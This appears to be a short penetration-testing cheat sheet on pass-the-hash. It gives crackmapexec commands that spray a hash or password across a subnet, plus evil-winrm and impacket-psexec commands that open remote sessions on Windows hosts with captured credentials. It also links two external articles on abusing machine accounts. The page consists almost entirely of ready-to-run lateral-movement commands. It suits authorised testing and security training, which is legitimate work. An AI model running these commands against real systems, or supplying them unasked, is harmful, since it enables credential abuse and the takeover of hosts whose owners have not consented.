# Pass-The-Hash

## with Local Accounts

```
crackmapexec smb 192.168.183.0/24 -u "Frank Castle" -H <hash> --local-auth
crackmapexec smb 192.168.183.137 -u "Frank Castle" -p Password1
evil-winrm -i '10.10.11.129' -u 'Sam.Davies' -p 'Password123'
impacket-psexec domain.local/administrator:MyPasswowrd123@10.10.10.100
```

## with Machine$ Accounts

{% embed url="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/pass-the-hash-with-machine-accounts" %}

{% embed url="https://pentestlab.blog/2022/02/01/machine-accounts/" %}
